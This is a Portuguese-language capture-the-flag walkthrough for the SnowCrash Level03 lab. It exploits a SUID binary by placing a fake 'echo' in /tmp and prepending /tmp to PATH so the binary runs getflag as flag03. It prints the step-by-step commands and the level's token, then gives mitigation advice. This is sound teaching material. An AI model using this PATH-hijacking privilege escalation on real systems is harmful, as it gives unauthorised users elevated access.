# SnowCrash — Level03 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é explorar um **binário SUID vulnerável** que executa comandos externos utilizando o `PATH`.

O exercício ensina:

- análise de binários ELF
- uso do comando `strings`
- entendimento de SUID
- exploração de PATH hijacking
- execução indireta via `/usr/bin/env`

---

## Arquivo disponível

Listando o diretório:

```bash
ls
```

Resultado:

```
level03
```

Existe apenas um binário executável.

---

## Identificação do tipo do arquivo

Executamos:

```bash
file level03
```

Resultado esperado:

```
ELF 32-bit executable
```

Ou seja: é um programa compilado em C.

---

## Verificando permissões do binário

Executamos:

```bash
ls -l level03
```

Resultado:

```
-rwsr-sr-x 1 flag03 level03 ...
```

O `s` nas permissões indica que o programa possui **SUID ativo**.

Significa: o programa executa com permissões do usuário `flag03`.

---

## Investigando o comportamento do binário

Como não temos o código-fonte, utilizamos:

```bash
strings level03
```

Entre as saídas aparece:

```
/usr/bin/env echo Exploit me
```

Isso mostra que o programa executa `echo Exploit me` utilizando `/usr/bin/env`.

---

## Identificação da vulnerabilidade

O uso de `/usr/bin/env echo` faz com que o sistema procure o comando `echo` dentro da variável `PATH`.

Isso permite substituir o comando original por outro controlado pelo usuário.

Este tipo de ataque chama-se: **PATH Hijacking**.

---

## Exploração da vulnerabilidade

Criamos um falso comando `echo`:

```bash
echo "/bin/getflag" > /tmp/echo
```

Damos permissão de execução:

```bash
chmod +x /tmp/echo
```

Alteramos o PATH:

```bash
export PATH=/tmp:$PATH
```

Executamos o binário vulnerável:

```bash
./level03
```

Agora o sistema executa `/tmp/echo` em vez de `/bin/echo`.

Como o programa roda com permissões de `flag03`, o comando executado também roda com essas permissões.

---

## Obtendo a flag

```bash
./level03
```

Resultado:

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**Token obtido:** `qi0maab88jeaj46qoumi7maus`

---

## Conceito aprendido

Este exercício demonstra um problema clássico: **execução insegura de comandos via PATH**.

Código vulnerável típico:

```c
system("echo hello");
```

Código seguro:

```c
system("/bin/echo hello");
```

Sempre utilizar caminhos absolutos evita ataques desse tipo.

---

## Mitigação em ambiente real

Nunca executar comandos externos assim:

```c
env comando
system("comando")
execvp("comando")
```

Preferir sempre:

```
/bin/comando
/usr/bin/comando
```

ou sanitizar completamente o `PATH` antes da execução.

---

## Ferramentas utilizadas

| Ferramenta | Função                     |
|------------|----------------------------|
| `ls`       | listar arquivos            |
| `file`     | identificar tipo do binário|
| `strings`  | extrair strings internas   |
| `chmod`    | alterar permissões         |
| `export`   | alterar variável PATH      |
| `getflag`  | obter token do nível       |

---

## Resultado final

**Usuário explorado:** `flag03`

**Token obtido:** `qi0maab88jeaj46qoumi7maus`
